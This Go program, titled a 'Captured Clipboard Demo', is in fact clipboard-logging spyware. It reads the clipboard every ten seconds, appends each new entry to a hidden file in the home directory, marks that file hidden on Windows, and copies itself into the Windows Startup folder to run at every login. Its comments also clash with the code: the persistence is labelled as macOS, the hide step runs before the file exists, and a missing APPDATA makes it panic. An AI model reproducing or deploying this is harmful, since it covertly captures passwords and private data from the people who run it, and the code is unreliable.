package main

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"

	"github.com/atotto/clipboard"
)

func main() {
	fmt.Println("Captured Clipboard Demo")

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	// Determine hidden file path in user's home directory
	homeDir, err := os.UserHomeDir()
	check(err)

	hiddenFile := filepath.Join(homeDir, ".clipboard_capture")

	// hide the file in Windows
	if runtime.GOOS == "windows" {
		err = hideFile(hiddenFile)
		check(err)
	}

	// Set up persistence at boot-time (macOS)
	err = setupPersistence()
	check(err)

	// start clipboard reading loop
	readClipboard(ticker, hiddenFile)
}

func readClipboard(ticker *time.Ticker, hiddenFile string) {
	var last string

	for {
		txt, err := clipboard.ReadAll()
		check(err)

		if txt != last {
			fmt.Printf("[%s]: %q\n", time.Now().Format(time.RFC3339), summarize(txt))
			last = txt
			if last != "" {
				storeClipboard(hiddenFile, last)
			}
		}
		<-ticker.C //wait for next tick
	}
}

func storeClipboard(path, data string) {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	check(err)

	defer f.Close()
	timestamp := time.Now().Format(time.RFC3339)
	entry := fmt.Sprintf("[%s]: %s\n", timestamp, data)
	_, err = f.WriteString(entry)
	check(err)

	// Hide the file on Windows after writing
	if runtime.GOOS == "windows" {
		hideErr := hideFile(path)
		if hideErr != nil {
			fmt.Printf("[WARN] Could not hide clipboard file: %v\n", hideErr)
		}
	}
}

// Copy the binary to the Windows Startup folder for autorun at login
func setupPersistence() error {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return fmt.Errorf("APPDATA environment variable not found")
	}
	startupDir := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	if _, err := os.Stat(startupDir); os.IsNotExist(err) {
		err = os.MkdirAll(startupDir, 0755)
		if err != nil {
			return err
		}
	}

	binaryPath, err := os.Executable()
	if err != nil {
		return err
	}
	binaryName := filepath.Base(binaryPath)
	targetPath := filepath.Join(startupDir, binaryName)

	// Copy binary if not already present
	if _, err := os.Stat(targetPath); os.IsNotExist(err) {
		in, err := os.Open(binaryPath)
		check(err)
		defer in.Close()

		out, err := os.OpenFile(targetPath, os.O_CREATE|os.O_WRONLY, 0755)
		check(err)
		defer out.Close()

		_, err = io.Copy(out, in)
		check(err)
	}

	return nil
}

func check(err error) {
	if err != nil {
		panic(err)
	}
}
func summarize(s string) string {
	// Keep output readable: show up to 300 chars
	if len(s) > 300 {
		return s[:300] + "...(truncated)"
	}
	return s
}

// hideFile sets the hidden attribute on a file in Windows
func hideFile(path string) error {
	if runtime.GOOS != "windows" {
		return nil
	}
	// Use attrib command to set hidden attribute
	cmd := execCommand("attrib", "+H", path)
	return cmd.Run()
}

// execCommand is a wrapper for exec.Command, to avoid import cycles in tests
var execCommand = func(name string, arg ...string) *exec.Cmd {
	return exec.Command(name, arg...)
}

